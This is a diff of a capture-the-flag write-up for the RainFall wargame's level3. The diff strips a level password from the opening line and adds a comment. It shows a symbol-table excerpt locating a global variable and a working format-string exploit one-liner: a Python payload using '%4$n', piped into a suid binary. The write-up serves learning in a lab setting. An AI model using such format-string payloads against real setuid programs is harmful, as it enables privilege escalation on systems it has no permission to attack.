@@ -1,6 +1,6 @@
-Once we are logged as level3/492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+Once we are logged as level3
 
-We are presented with a suid binary named level3.
+We are presented with a suid binary.
 
 We try executing it
 level3@RainFall:~$ ./level3
@@ -73,6 +73,8 @@ SYMBOL TABLE:
 08048168 l    d  .note.gnu.build-id	00000000              .note.gnu.build-id
 0804818c l    d  .gnu.hash	00000000              .gnu.hash
 0804988c g     O .bss	00000004              m ------------>>>> Here is the variable
+
+Writing n padding into the 4th argument.
 
 So the command we need to inject is like this : (python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"';cat)| ./level3
 
